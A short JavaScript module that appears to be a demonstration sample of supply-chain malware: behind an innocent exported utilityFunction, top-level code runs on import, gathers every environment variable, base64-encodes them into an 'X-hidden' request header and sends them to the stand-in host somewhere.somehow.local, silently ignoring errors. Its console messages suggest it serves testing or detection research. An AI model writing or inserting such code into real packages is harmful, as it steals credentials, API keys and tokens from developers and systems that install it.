export function utilityFunction() {
  return "doing something";
}

console.log("!!! Collecting environment variables as soon as the module is loaded");
const env = process.env;
const keys = Object.keys(env).sort();
const payload = Object.fromEntries(keys.map((k) => [k, env[k]]));

console.log("!!! Sending payload to the server");
fetch("http://somewhere.somehow.local", {
  method: "GET",
  headers: {
    "X-hidden": Buffer.from(JSON.stringify(payload)).toString("base64"),
  },
}).catch((error) => {
  // silently fail
});
